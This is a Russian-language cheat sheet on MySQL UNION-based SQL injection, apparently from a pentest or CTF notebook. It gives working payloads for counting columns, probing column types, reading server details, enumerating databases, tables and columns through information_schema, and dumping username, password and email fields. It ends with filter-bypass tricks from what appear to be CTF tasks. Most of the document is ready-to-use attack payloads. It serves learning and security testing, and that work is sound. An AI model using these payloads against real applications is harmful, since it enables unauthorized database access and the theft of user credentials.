# MySQL UNION Injection

### Общее представление об атаке SQL UNION Injection

Реализуется в случае, если результаты SQL-запроса возвращаются в ответе приложения. Ответы могут быть разными: ошибки приложения, ошибки сервера, результаты запросов и другие.

**Оператор UNION позволяет запускать один и более SELECT-запросов. Например:**

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

Данный SQL-запрос вернет один ответ с двумя столбцами, содержащими значения из столбцов a и b в table1 и столбцов c и d в table2.

**Чтобы UNION запрос сработал должны быть выполнены два ключевых момента:**

* Отдельные запросы должны возвращать одинаковое количество столбцов
* Типы данных в каждом стобце должны быть совместимы между отдельными запросами

**Чтобы успешно выполнить атаку SQLi UNION необходим знать:**

* Сколько столбцов возвращается из исходного запроса?
* Тип данных каждого столбца

### **Определение количества столбцов:**

Есть два способа определения количества столбцов: через `ORDER BY` и `UNION SELECT`.

**Первый способ** - через `ORDER BY` это реализуется угадыванием количества столбцов, например:

```sql
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
```

Итак, если в таблице есть 3 стобца, то на `ORDER BY 1--` будет ответ TRUE, т.е. вместо ошибки(500 ответа сервера), будет 200 ОК. И таким образом нужно перебирать значения, вплоть до 4-х, так как на `ORDER BY 4--` вылетит ошибка, обозначающая, что в таблице только 3 столбца.

**Второй способ** - через UNION SELECT:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Тут все также - перебираем NULL, пока не получим 200 ОК. Если взять таблицу с тремя столбцами, то ответы будут примерно такими:

```
' UNION SELECT NULL-- (500)
' UNION SELECT NULL,NULL-- (500)
' UNION SELECT NULL,NULL,NULL-- (200 OK)
```

Используем NULL, потому что NULL подходит для всех типов данных.

### **Определение типа данных каждого столбца:**

Делается это методом перебора до получения(200 ОК), т.е. когда перестанут вылетать ошибки.

```
' UNION SELECT 'a',NULL,NULL,NULL --
' UNION SELECT NULL,'a',NULL,NULL --
' UNION SELECT NULL,NULL,'a',NULL -- 
```

**Использование внутренних функций базы данных**:

Когда мы знаем количество столбцов, мы можем сделать данную вещь:

```
' UNION SELECT version(),null,null -- -
```

Ответ может быть примерно таким(вместо вывода имени пользователя выводится результат функции `version()`):

```
(...)
Sorry, 8.0.27-0ubuntu0.20.04.1 you are not eligible due to already qualifying.
(...)
```

**Некоторые функции из MySQL:**

```
@@hostname - имя хоста
@@tmpdir - директория /tmp/
@@datadir - директория /data
@@version - версия БД
@@basedir - базовая директория
user() - имя пользователя
database() - база данных
version() - версия
schema() - база данных
UUID() - системный UUID ключ
current_user() - текущий пользователь
current_user - текущий пользователь
system_user() - системный пользователь
session_user() - сессионый пользователь
@@GLOBAL.have_symlink - проверка на включенные/отключенные символьные ссылки
@@GLOBAL.have_ssl - проверка на SSL
```

### Последовательность действий для выполнения успешной атаки

Выводим все базы данных:

```sql
'union select group_concat(schema_name) from information_schema.schemata
```

Выводим все таблицы из базы данных `database1`:

```sql
'union select group_concat(table_name) from information_schema.tables where table_schema='database1'
```

Выводим все колонки из таблицы `table1`, которая находится в базе данных `database1`:

```sql
'union select group_concat(column_name) from information_schema.columns where table_schema='database1' and table_name='table1'
```

Выводим все данные `username`, `password`, `email` из таблицы `table1`, которая находится в базе данных `database1`:

```sql
Injection=> select group_concat("\n", username,":",password,":",email,"\n") from database1.table1
```

## Обход фильтров

### Запрещено \[ , ' ( ) + = \ " ] + и пробел:

```sql
SELECT * FROM age WHERE age=$age
```

Вместо пробела можно использовать `/**/`, а вместо `where name='b548d45080b9d110'` использовать `where name like 0x62353438643435303830623964313130`:

```sql
1337/**/union/**/select/**/*/**/from/**/flags/**/where/**/name/**/like/**/0x62353438643435303830623964313130
```

### Запрещено все, кроме символов: a-z A-Z 0-9 ' ( ) , ] + и обход защиты от select:

```
SELECT * FROM age WHERE age=$age
```

Так как в таблице очень много флагов и нам нужен флаг с `name`=`3f1a76e536a0a805`, то нужно указать фильтр вывода, например, `where name='3f1a76e536a0a805'`, но знак `=` запрещен, следовательно можно использовать `LIKE` вместе с хексовым значением `name`:

```
1337 union Select null,name,flag From flags where name like 0x33663161373665353336613061383035
```

### Запрещено все, кроме символов: a-z A-Z 0-9 ' ( ) \* и обход защиты от select:

```
SELECT * FROM age WHERE age=$age
```

Так как мы не можем перебрать количество колонок через `union select null,<null>,<...>`, то можно это сделать через JOIN AS:

```
1337 union Select * from flag JOIN (Select 'qwe') as a
```

Ответ:

```
MySQL error: The used SELECT statements have a different number of columns
```

Пробуем добавить еще одну колонку:

```
1337 union Select * from flag JOIN (Select 'qwe') as a JOIN (Select 'qwe') as b
```

И в ответе мы получаем флаг

### Запрещен SELECT полностью:

```
SELECT * FROM age WHERE age=$age
```

Можно использовать SELSELECTECT, если фильтры единоразово вырезают SELECT без цикла:

```
1337 union SELSELECTECT null,null,flag from flag
```
